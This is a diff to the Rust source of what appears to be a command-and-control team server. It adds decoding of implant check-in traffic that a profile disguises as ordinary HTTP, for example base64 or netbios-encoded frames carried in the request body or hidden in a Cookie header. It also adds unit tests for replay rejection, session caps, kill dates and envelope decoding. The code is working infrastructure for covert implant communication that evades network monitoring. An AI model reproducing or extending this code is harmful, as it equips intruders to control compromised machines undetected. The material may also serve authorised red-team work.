@@ -36,7 +36,7 @@ pub const BEACON_BODY_LIMIT: usize = 512 * 1024;
 use axum::{
     body::Bytes,
     extract::{ConnectInfo, DefaultBodyLimit, Query, State},
-    http::{HeaderMap, StatusCode},
+    http::{HeaderMap, Method, StatusCode},
     response::{IntoResponse, Response},
     routing::{get, post},
     Json, Router,
@@ -309,9 +309,11 @@ pub fn router(state: Arc<AppState>) -> Router {
 async fn beacon(
     State(st): State<Arc<AppState>>,
     ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    method: Method,
+    headers: HeaderMap,
     body: Bytes,
 ) -> Response {
-    match handle_beacon(&st, &peer, &body) {
+    match handle_beacon(&st, &peer, &method, &headers, &body) {
         Ok(frame) => shape_beacon_response(&st, frame),
         Err(e) => {
             tracing::warn!(error = %e, "beacon handler error");
@@ -431,7 +433,13 @@ fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
     diff == 0
 }
 
-fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> anyhow::Result<Vec<u8>> {
+fn handle_beacon(
+    st: &AppState,
+    peer: &std::net::SocketAddr,
+    method: &Method,
+    headers: &HeaderMap,
+    body: &[u8],
+) -> anyhow::Result<Vec<u8>> {
     // Kill date: once reached, refuse all beacon traffic so a burned server goes
     // dark (checked per-request, not just at boot, so a long-running server
     // honors it too). Fail CLOSED on a clock error: `unwrap_or(0)` would treat
@@ -446,7 +454,51 @@ fn handle_beacon(st: &AppState, peer: &std::net::SocketAddr, body: &[u8]) -> any
             anyhow::bail!("kill date {kd} reached; refusing beacon");
         }
     }
-    let raw = parse_frame(body)?;
+    // Invert the profile's client-side request envelope (if any) before parsing.
+    // No profile, or a client block with no transform chain → the body IS the raw
+    // frame (identity, zero extra work: parse_frame runs on `body` directly). A
+    // transform chain (base64/mask/...) → pull the transformed bytes from the body
+    // (print/uri-append/none) or the terminator header, then decode.
+    let raw = if let Some(profile) = &st.profile {
+        let env = if *method == Method::POST {
+            nyx_profile::post_client_envelope(profile)
+        } else {
+            nyx_profile::get_client_envelope(profile)
+        };
+        if env.is_noop() {
+            // No client block declared → the body IS the raw frame. `is_noop()`
+            // is the single source of truth for "nothing to do", so a step-free
+            // header/parameter terminator CANNOT accidentally take this fast
+            // path and skip locating its bytes (the bug where
+            // `client { output { header "Cookie"; } }` dropped every check-in).
+            parse_frame(body)?
+        } else {
+            // Locate the on-wire bytes per the terminator (body for print/none/
+            // uri-append, the named header for a header terminator), then invert
+            // the transform chain if any.
+            let on_wire: &[u8] = match &env.terminator {
+                Some(nyx_profile::Terminator::Header(h)) => headers
+                    .get(h.as_str())
+                    .map(|hv| hv.as_bytes())
+                    .ok_or_else(|| {
+                        anyhow::anyhow!("client envelope expects request header `{h}`")
+                    })?,
+                Some(nyx_profile::Terminator::Parameter(p)) => anyhow::bail!(
+                    "client envelope parameter terminator `{p}` unsupported on the beacon path"
+                ),
+                _ => body,
+            };
+            if env.steps.is_empty() {
+                parse_frame(on_wire)?
+            } else {
+                let decoded = nyx_profile::decode(&env.steps, on_wire)
+                    .map_err(|e| anyhow::anyhow!("client envelope decode failed: {e}"))?;
+                parse_frame(&decoded)?
+            }
+        }
+    } else {
+        parse_frame(body)?
+    };
 
     // Decide new-vs-existing and (for existing) grab the session key. This
     // read-guard counter check is ADVISORY only: it lets us skip the decrypt
@@ -1267,12 +1319,12 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
-        handle_beacon(&st, &peer, &checkin).expect("first check-in must register the session");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("first check-in must register the session");
         // A legitimate advance to counter 2 succeeds.
         let frame2 = response_frame(&pubkey, &key, 2);
-        handle_beacon(&st, &peer, &frame2).expect("counter 2 must advance");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2).expect("counter 2 must advance");
         // Replaying counter 2 (stale: counter <= last_recv) must be rejected.
-        let err = handle_beacon(&st, &peer, &frame2)
+        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
             .expect_err("a stale counter must be rejected, not accepted");
         assert!(
             err.to_string().contains("replayed/stale counter"),
@@ -1290,7 +1342,7 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
-        handle_beacon(&st, &peer, &checkin).expect("check-in must register the session");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in must register the session");
 
         // Race N times on monotonically-increasing counters. A single iteration
         // could accidentally serialize on a loaded CI box; N iterations make a
@@ -1309,7 +1361,7 @@ mod tests {
                 let barrier = barrier.clone();
                 handles.push(std::thread::spawn(move || {
                     barrier.wait();
-                    handle_beacon(&st, &peer, &frame).is_ok()
+                    handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame).is_ok()
                 }));
             }
             let results: Vec<bool> = handles.into_iter().map(|h| h.join().unwrap()).collect();
@@ -1370,7 +1422,7 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7777".parse().unwrap();
         let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
-        let err = handle_beacon(&st, &peer, &checkin)
+        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
             .expect_err("a check-in past the session cap must be rejected");
         assert!(
             err.to_string().contains("session registry full"),
@@ -1388,7 +1440,7 @@ mod tests {
         let pubkey = ServerKeypair::generate().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7776".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
-        handle_beacon(&st, &peer, &checkin).expect("check-in");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in");
 
         let overflow = 100;
         let batch: Vec<TaskResponse> = (0..(MAX_RESULTS_PER_SESSION as u64 + overflow))
@@ -1399,7 +1451,7 @@ mod tests {
             .collect();
         let plaintext = TaskResponse::encode_vec(&batch);
         let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plaintext);
-        handle_beacon(&st, &peer, &frame).expect("ingest of oversized result batch");
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame).expect("ingest of oversized result batch");
 
         let s = st.sessions.get(&pubkey).expect("session present");
         assert_eq!(
@@ -1431,7 +1483,7 @@ mod tests {
         let mut st = AppState::default();
         st.killdate = Some(1); // 1970-01-01 — always in the past.
         let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
-        let err = handle_beacon(&st, &peer, &checkin)
+        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
             .expect_err("a past kill-date must refuse beacons");
         assert!(
             err.to_string().contains("kill date"),
@@ -1442,7 +1494,7 @@ mod tests {
         let mut st2 = AppState::default();
         st2.killdate = Some(u64::MAX);
         let (_key, checkin2) = checkin_frame(&st2, &pubkey, 1);
-        handle_beacon(&st2, &peer, &checkin2).expect("a future kill-date must allow check-in");
+        handle_beacon(&st2, &peer, &Method::POST, &HeaderMap::new(), &checkin2).expect("a future kill-date must allow check-in");
     }
 
     #[test]
@@ -1465,5 +1517,104 @@ mod tests {
         }
         .into_command();
         assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
+    }
+
+    // ---- Client-envelope decode (Phase 1 Task 1.2) --------------------------
+    //
+    // Lock the server half: when a profile declares a `client { output/metadata
+    // { ... } }` transform, the implant encodes its frame before sending and the
+    // server MUST invert it in handle_beacon to recover the raw frame. Both the
+    // body (`print`) and header terminator paths are pinned. The encode side
+    // uses nyx_profile's own transform engine — the exact bytes the production
+    // implant (Task 1.3) will produce — so this is a true end-to-end contract
+    // for the decode half, independent of WinHTTP.
+
+    #[test]
+    fn client_envelope_base64_body_is_inverted_before_parse() {
+        // `client { output { base64; print; } }` → implant base64-encodes its
+        // frame into the request body. Server base64-decodes → raw frame →
+        // parse_frame → session registered.
+        let profile = nyx_profile::parse(
+            r#"http-post {
+                set uri "/beacon";
+                client { output { base64; print; } }
+                server { output { print; } }
+            }"#,
+        )
+        .expect("profile parses");
+        let mut st = AppState::default();
+        st.profile = Some(profile);
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7001".parse().unwrap();
+        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
+        // Implant side: base64 the frame via the SAME engine the server inverts.
+        let on_wire = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &on_wire)
+            .expect("base64 client envelope must be decoded to register the session");
+        assert!(
+            st.sessions.contains_key(&pubkey),
+            "session must be registered after envelope decode"
+        );
+    }
+
+    #[test]
+    fn client_envelope_header_terminator_reads_cookie_header() {
+        // `client { metadata { base64; header "Cookie"; } }` on http-get → the
+        // transformed bytes ride in the Cookie header, body empty. Server reads
+        // the header, decodes, registers. This is the distinct header-terminator
+        // path (vs the body/print path above).
+        let profile = nyx_profile::parse(
+            r#"http-get {
+                set uri "/beacon";
+                client { metadata { base64; header "Cookie"; } }
+                server { output { print; } }
+            }"#,
+        )
+        .expect("profile parses");
+        let mut st = AppState::default();
+        st.profile = Some(profile);
+        let pubkey = ServerKeypair::generate().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7002".parse().unwrap();
+        let (_key, frame) = checkin_frame(&st, &pubkey, 1);
+        let cookie_val = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
+        let mut headers = HeaderMap::new();
+        headers.insert(
+            axum::http::HeaderName::from_static("cookie"),
+            axum::http::HeaderValue::from_bytes(&cookie_val).unwrap(),
+        );
+        handle_beacon(&st, &peer, &Method::GET, &headers, &[])
+            .expect("header-terminator envelope must read Cookie to register");
+        assert!(st.sessions.contains_key(&pubkey));
+    }
+
+    #[test]
+    fn client_envelope_decode_failure_is_a_clean_400_not_a_panic() {
+        // A garbled body that the transform can't invert (truncated base64 etc.)
+        // must surface as a clean anyhow error → 400, NOT a panic. The server
+        // runs under panic = "abort"; a panic here would kill the team server.
+        let profile = nyx_profile::parse(
+            r#"http-post {
+                set uri "/beacon";
+                client { output { netbios; print; } }
+                server { output { print; } }
+            }"#,
+        )
+        .expect("profile parses");
+        let mut st = AppState::default();
+        st.profile = Some(profile);
+        let peer: std::net::SocketAddr = "127.0.0.1:7003".parse().unwrap();
+        // netbios expects pairs in a-p; an odd-length / out-of-range body fails decode.
+        let err = handle_beacon(
+            &st,
+            &peer,
+            &Method::POST,
+            &HeaderMap::new(),
+            b"not-valid-netbios!!!",
+        )
+        .expect_err("undecodable envelope body must error, not panic");
+        assert!(
+            err.to_string().contains("client envelope decode failed"),
+            "expected a decode-failure error, got: {err}"
+        );
     }
 }
